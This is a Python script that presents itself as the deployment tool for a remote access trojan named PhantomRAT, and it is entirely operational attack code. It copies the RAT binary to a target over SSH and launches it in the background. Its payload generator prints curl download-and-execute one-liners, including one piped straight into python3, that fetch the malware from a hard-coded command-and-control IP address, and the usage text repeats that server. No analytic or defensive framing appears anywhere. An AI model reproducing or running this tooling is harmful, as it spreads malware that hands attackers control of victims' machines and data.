#!/usr/bin/env python3
"""
PhantomRAT Auto-Deployment Script
"""
import os
import sys
import subprocess
import paramiko
from scp import SCPClient
import argparse

def deploy_via_ssh(host, username, password=None, key_file=None):
    """Deploy via SSH"""
    print(f"[*] Deploying to {username}@{host}")
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        if key_file:
            ssh.connect(host, username=username, key_filename=key_file)
        elif password:
            ssh.connect(host, username=username, password=password)
        else:
            ssh.connect(host, username=username)
        
        # Upload executable
        with SCPClient(ssh.get_transport()) as scp:
            scp.put('dist/phantomrat', '/tmp/phantomrat')
        
        # Execute
        ssh.exec_command('chmod +x /tmp/phantomrat && /tmp/phantomrat &')
        
        print(f"[+] Successfully deployed to {host}")
        ssh.close()
        return True
        
    except Exception as e:
        print(f"[!] SSH deployment failed: {e}")
        return False

def generate_payload():
    """Generate various payloads"""
    c2_ip = "141.105.71.196"
    
    print("\n" + "="*60)
    print("📦 PAYLOAD GENERATION")
    print("="*60)
    
    print("\n🔗 Download URLs:")
    print(f"  http://{c2_ip}:9000/dist/phantomrat")
    print(f"  http://{c2_ip}:8000/phantomrat_main.py")
    
    print("\n🐚 One-liners:")
    print(f"  # Executable: curl -s http://{c2_ip}:9000/dist/phantomrat -o /tmp/p && chmod +x /tmp/p && /tmp/p &")
    print(f"  # Python: curl -s http://{c2_ip}:8000/phantomrat_main.py | python3 &")
    
    print("\n📁 Local files:")
    print("  dist/phantomrat - Standalone executable")
    print("  phantomrat_main.py - Python script")
    
    print("="*60)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PhantomRAT Deployment Tool")
    parser.add_argument("--ssh", help="Deploy via SSH (user@host)")
    parser.add_argument("--password", help="SSH password")
    parser.add_argument("--key", help="SSH key file")
    parser.add_argument("--generate", action="store_true", help="Generate payloads")
    
    args = parser.parse_args()
    
    if args.ssh:
        if "@" in args.ssh:
            username, host = args.ssh.split("@")
        else:
            username = "root"
            host = args.ssh
        
        deploy_via_ssh(host, username, args.password, args.key)
    
    elif args.generate:
        generate_payload()
    
    else:
        print("PhantomRAT Deployment Tool")
        print("="*40)
        print("\nUsage:")
        print("  Deploy via SSH: python3 auto_deploy.py --ssh user@host")
        print("  Generate payloads: python3 auto_deploy.py --generate")
        print("\nYour C2 Server: http://141.105.71.196:8000")
